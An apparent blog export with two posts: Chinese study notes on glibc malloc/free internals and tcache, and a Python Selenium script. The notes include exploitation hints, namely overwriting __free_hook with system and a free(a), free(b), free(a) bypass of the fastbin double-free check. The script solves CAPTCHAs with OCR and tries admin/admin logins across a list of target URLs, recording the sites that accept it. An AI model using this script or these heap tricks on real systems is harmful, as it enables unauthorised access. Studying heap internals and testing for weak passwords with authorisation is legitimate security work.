<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">malloc寻找堆块的顺序:</span><br><span class="line">1. 在fastbin中寻找有没有对应的chunk</span><br><span class="line">2. 请求大小为small bin范围，在small bin中寻找有没有对应的chunk</span><br><span class="line">3. 考虑是否是large bin，调用malloc_consolidate合并fastbin</span><br><span class="line">   （ fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理）</span><br><span class="line"></span><br><span class="line">（↓进入大循环↓）</span><br><span class="line">4. 在unsorted bin中寻找有没有合适的chunk</span><br><span class="line">  如果小于unsorted bin，就对unsorted bin进行切割；如果不满足请求的大小，先把unsorted bin放入small bins或large bins ，然后进行下一步</span><br><span class="line">（--大循环结束--最多迭代10000次）</span><br><span class="line"></span><br><span class="line">5. 在large bin中寻找有没有合适的chunk，根据smalllest-first，best-fit 的原则</span><br><span class="line">  （ps:large bin中的堆块不会进行切割，不满足就到top chunk切割（这个知识点与分配无关）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6. 寻找较大的bin链中有没有合适的chunk</span><br><span class="line">寻找所有map中合适大小的chunk</span><br><span class="line"></span><br><span class="line">7. 使用top_chunk</span><br><span class="line"></span><br><span class="line">8. top_chunk不够用，如果是主分配区就调用sbrk()；非主分配区就调用mmap()，增加top_chunk大小</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>大循环</li>
</ul>
<ol>
<li>按照 FIFO 的方式逐个将 unsorted bin 中的 chunk 取出来<br>
如果是 small request，则考虑是不是恰好满足，是的话，直接返回。<br>
如果不是的话，放到对应的 bin 中。</li>
</ol>
<p>__int_malloc的大循环主要用来处理unsorted bin。如果整个循环没有找到合适的bin，说明所有的unsorted bin的大小都不满足要求</p>
<ul>
<li>malloc_consolidate：用于将fastbin中的chunk合并，清空fastbin。<br>
先尝试向后合并，然后尝试向前合并：<br>
如果向前相邻topchunk则直接合并，如果不相邻则尝试向前合并后插入unsortedbin， 然后获取下一个空闲的chunk，直到fastbin清空</li>
</ul>
<h2 id="堆分配函数">堆分配函数</h2>
<ul>
<li>malloc</li>
<li>calloc<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>realloc</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时</span><br><span class="line">  如果申请 size &gt; 原来 size</span><br><span class="line">    如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</span><br><span class="line">    如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</span><br><span class="line">  如果申请 size &lt; 原来 size</span><br><span class="line">    如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</span><br><span class="line">    如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</span><br><span class="line">当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</span><br><span class="line">当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</span><br></pre></td></tr></table></figure>
<h1>free的时候发生了什么</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjX19saWJjX2ZyZWU=">源码<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="libc-free">__libc_free</h2>
<p>只有一个参数，为需要free的地址判断：</p>
<ol>
<li>是否hook了（有则执行free_hook，结束free）（下）</li>
<li>free的参数，为NULL直接返回</li>
<li>（指针指向chunk头部）</li>
<li>如果内存是mmap得到的则进行munmap_chunk()，否则执行_int_free（参数为main_arena结构体的地址、header、0）</li>
</ol>
<ul>
<li>free_hook：<br>
判断是否有用户自定义的函数，如果有就执行，然后结束堆释放<br>
<strong>__free_hook漏洞</strong>：如果将__free_hook变为一个system的地址，那么就可以执行这个system的地址</li>
</ul>
<h3 id="int-free">_int_free</h3>
<h4 id="检查">检查</h4>
<ol>
<li>不能指向非法地址</li>
<li>指针对齐2*SIZE_SZ（32位下=4；64位下=8）</li>
<li>free的空间大小小于限制最小的chunk</li>
</ol>
<p>如果检查没有问题就在各个bin分支进行判断</p>
<h3 id="fastbin">fastbin</h3>
<p>如果size小于等于fastbin的最大size且不与top chunk相邻，就进入fastbin分支进行判断，符合条件就插入fastbin头部，成为第一个chunk检查：</p>
<ul>
<li>下一个chunk大小小于2*SIZE_SZ</li>
<li>下一个chunk大小小于system_mem（系统分配的空间总量）<br>
在结构体malloc_state最后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">INTERNAL_SIZE_T system_mem;</span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br></pre></td></tr></table></figure>
<ul>
<li>设置chunk的mem部分为perturb_byte</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line">free_perturb (<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure>
<p>perturb_byte:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"></span><br><span class="line">do_set_perturb_byte (<span class="keyword">int32_t</span> value)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_mallopt_perturb, <span class="number">2</span>, value, perturb_byte);</span><br><span class="line">  perturb_byte = value;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>set_fastchunks，对arena的flags标志位的最低bit清零</li>
<li>用chunk的大小判断应该放进哪个fastbin中</li>
<li>对应fastbin的头指针初始化为NULL</li>
<li>automically插入链表:
<ol>
<li>chunk的fd赋值为fastbin的值</li>
<li>fastbin赋值为当前chunk的地址</li>
</ol>
</li>
<li>简单的double free检查，如果top of bin和当前free对象相同则报错，bypass方法为</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a)</span><br><span class="line"><span class="built_in">free</span>(b)</span><br><span class="line"><span class="built_in">free</span>(a)</span><br></pre></td></tr></table></figure>
<ul>
<li>fastbin entry 判断</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>另外还有一些多线程的操作没有记上<br>
free一个fastbin的过程只进行了一些判断和链接操作，对inuse位没有处理</p>
<h4 id="代码">代码</h4>
<p>想把代码放上来，但是折叠之后不知道怎么高亮…<br>
从：<br>
<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjNDIzMg==">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4232<i class="fa fa-external-link-alt"></i></span><br>
到4301行</p>
<h3 id="非fastbin">非fastbin</h3>
<p>包括smallbin、largebin、unsortbin</p>
<h4 id="consolidate-free">consolidate&amp;&amp;free</h4>
<p>合并区块的顺序：先考虑物理低地址的空闲块，合并后的chunk指向合并的chunk的低地址</p>
<p>步骤：</p>
<ol>
<li>获得下一个chunk的地址</li>
<li>3个double free check</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">   top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                    &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                    &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>调用free_perturb函数</li>
<li>向后合并</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>向前合并</li>
</ol>
<ul>
<li>如果下一个chunk不是top chunk，则合并高地址的chunk，并将合并后的chunk放入unsorted bin</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">  <span class="comment">/* consolidate forward */</span></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">    size += nextsize;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">    not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">    been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  bck = unsorted_chunks(av);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">  p-&gt;fd = fwd;</span><br><span class="line">  p-&gt;bk = bck;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  bck-&gt;fd = p;</span><br><span class="line">  fwd-&gt;bk = p;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">  check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果下一个chunk是top chunk，则合并到top chunk中</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>向系统返还内存<br>
如果合并后的chunk大小大于fastbin_consolidation_threshold（默认64k），就向系统返还内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放mmap出的内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="tcache">tcache</h2>
<p>glibc2.26后引入的技术，提升堆管理的性能，也舍弃了很多安全检查</p>
<p>引入了两个结构体&quot;tcache_entry&quot;和&quot;tcache_perthread_struct&quot;</p>
<ul>
<li><strong>tcache_entry</strong>用单向链表的方式连接大小相同的空闲chunk结构体；</li>
<li>每个线程会维护一个<strong>tcache_perthread_struct</strong>，作为tcache的管理结构，维护tcache_max_bins个计数器和tcache_max_bins项tcache_entry，规定每条tcache_entry最多有七个chunk</li>
</ul>
<h3 id="工作方式">工作方式</h3>
<ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 tcache_prethread_struct 。</li>
<li>free 内存，且 size 小于 small bin size 时
<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空，tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h1>参考：</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE3NzEzOTM1L2FydGljbGUvZGV0YWlscy84NjIzMTUwMg==">https://blog.csdn.net/qq_17713935/article/details/86231502<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNDc1Mzg2MQ==">Linux堆内存管理深入分析（上）<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNDc5MDE2NA==">Linux堆内存管理深入分析（下）<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L2dsaWJjLWhlYXAvaW1wbGVtZW50YXRpb24vb3ZlcnZpZXcv">ctf-wiki<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83NzMxNjIwNg==">https://zhuanlan.zhihu.com/p/77316206<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>一个自动验证多个弱密码的脚本（含验证码识别）</title>
    <url>/35069.html</url>
    <content><![CDATA[<p>实习期间写的，能用就行</p>
<span id="more"></span>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pip install dddd_ocr</span></span><br><span class="line"><span class="string">pip install selenium</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Text</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"><span class="keyword">from</span> requests.models <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pic</span>(<span class="params">url</span>):</span></span><br><span class="line">  </span><br><span class="line">    browser.get(url)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    png = browser.find_element_by_id(<span class="string">&#x27;imgObj&#x27;</span>)  <span class="comment"># 查找验证码元素</span></span><br><span class="line">    png.screenshot(<span class="string">&#x27;capt.png&#x27;</span>)  <span class="comment"># 对验证码进行截图并保存</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;capt.png&#x27;</span>)</span><br><span class="line">    img = img.convert(<span class="string">&#x27;L&#x27;</span>)  <span class="comment"># P模式转换为L模式(灰度模式默认阈值127)</span></span><br><span class="line">    count = <span class="number">190</span>  <span class="comment"># 设定阈值</span></span><br><span class="line">    table = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt; count:</span><br><span class="line">            table.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            table.append(<span class="number">1</span>)</span><br><span class="line">    img = img.point(table, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    img.save(<span class="string">&#x27;captcha1.png&#x27;</span>)  <span class="comment"># 保存处理后的验证码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def bd_discern():     #百度OCR，要钱</span></span><br><span class="line"><span class="comment">#     APP_ID = &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     API_KEY = &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     SECRET_KEY = &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     # 初始化对象</span></span><br><span class="line"><span class="comment">#     client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span></span><br><span class="line"><span class="comment">#     # 读取图片</span></span><br><span class="line"><span class="comment">#     def get_file_content(file_path):</span></span><br><span class="line"><span class="comment">#         with open(file_path, &#x27;rb&#x27;) as f:</span></span><br><span class="line"><span class="comment">#             return f.read()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     image = get_file_content(&#x27;captcha1.png&#x27;)</span></span><br><span class="line"><span class="comment">#     # 定义参数变量</span></span><br><span class="line"><span class="comment">#     options = &#123;&#x27;language_type&#x27;: &#x27;ENG&#x27;, &#125;  # 识别语言类型，默认为&#x27;CHN_ENG&#x27;中英文混合</span></span><br><span class="line"><span class="comment">#     #  调用通用文字识别</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         result = client.basicGeneral(image, options)  # 高精度接口 basicAccurate  </span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         print(&quot;???&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print (result)</span></span><br><span class="line"><span class="comment">#     for word in result[&#x27;words_result&#x27;]:</span></span><br><span class="line"><span class="comment">#         captcha = (word[&#x27;words&#x27;])</span></span><br><span class="line"><span class="comment">#         print(&#x27;识别结果：&#x27; + captcha)</span></span><br><span class="line"><span class="comment">#         return captcha</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dddd_ocr</span>():</span></span><br><span class="line">    ocr = ddddocr.DdddOcr()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./captcha1.png&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        img = f.read()</span><br><span class="line">    res = ocr.classification(img)</span><br><span class="line">    <span class="built_in">print</span> (res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span>(<span class="params">cap</span>):</span></span><br><span class="line">    browser.find_element_by_id(<span class="string">&#x27;aa&#x27;</span>).send_keys(<span class="string">&#x27;admin&#x27;</span>)  </span><br><span class="line">    browser.find_element_by_id(<span class="string">&#x27;bb&#x27;</span>).send_keys(<span class="string">&#x27;admin&#x27;</span>)  </span><br><span class="line">    browser.find_element_by_id(<span class="string">&#x27;cc&#x27;</span>).send_keys(cap) </span><br><span class="line">    browser.find_element_by_id(<span class="string">&#x27;loginBtn&#x27;</span>).click()</span><br><span class="line">  </span><br><span class="line"><span class="comment"># def is_alter():</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         alter = browser.switch_to.alert()</span></span><br><span class="line"><span class="comment">#         alter.text</span></span><br><span class="line"><span class="comment">#         if &#x27;密码错误&#x27; in dig_alert.text :</span></span><br><span class="line"><span class="comment">#             browser.quit()</span></span><br><span class="line"><span class="comment">#             return 1</span></span><br><span class="line"><span class="comment">#         elif &#x27;验证码错误&#x27; in dig_alert.text:</span></span><br><span class="line"><span class="comment">#             dig_alert.accept()</span></span><br><span class="line"><span class="comment">#             return 2</span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         return False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    outputH=<span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\实习\ip\脚本\outputH.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">    option = webdriver.ChromeOptions()</span><br><span class="line">    <span class="comment"># 防止打印一些无用的日志</span></span><br><span class="line">    option.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>, <span class="string">&#x27;enable-logging&#x27;</span>])</span><br><span class="line">    option.add_argument(<span class="string">&#x27;--ignore-certificate-errors&#x27;</span>)</span><br><span class="line">    <span class="comment"># 阻止弹出浏览器</span></span><br><span class="line">    option.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">    option.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    web = <span class="built_in">open</span>(<span class="string">&quot;target.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">    lines = web.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        browser = webdriver.Chrome(<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>,chrome_options=option)</span><br><span class="line">        browser.set_page_load_timeout(<span class="number">10</span>)</span><br><span class="line">        max_time=<span class="number">4</span></span><br><span class="line">        <span class="keyword">while</span> max_time:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                get_pic(i)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                browser.quit()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#cap = bd_discern()</span></span><br><span class="line">            cap = dddd_ocr()</span><br><span class="line">            url1 = browser.current_url</span><br><span class="line">          </span><br><span class="line">            max_time=max_time-<span class="number">1</span></span><br><span class="line">            submit(cap)     <span class="comment">#尝试登录</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">          </span><br><span class="line">            <span class="keyword">try</span>:            <span class="comment">#如果浏览器弹出对话框</span></span><br><span class="line">                dig_alert = browser.switch_to_alert()</span><br><span class="line">                dig_alert.text</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> dig_alert.text :   <span class="comment">#停止尝试当前url</span></span><br><span class="line">                    browser.quit()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&#x27;验证码错误&#x27;</span> <span class="keyword">in</span> dig_alert.text:    <span class="comment">#再次登录</span></span><br><span class="line">                    dig_alert.accept()</span><br><span class="line">                    <span class="keyword">continue</span>              </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="comment">#判断进入了后台则记录到文本中</span></span><br><span class="line">                url2 = browser.current_url</span><br><span class="line">                <span class="built_in">print</span>(url1)</span><br><span class="line">                <span class="built_in">print</span>(url2)</span><br><span class="line"></span><br><span class="line">                outputH.write(i)</span><br><span class="line">                outputH.flush()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
</search>
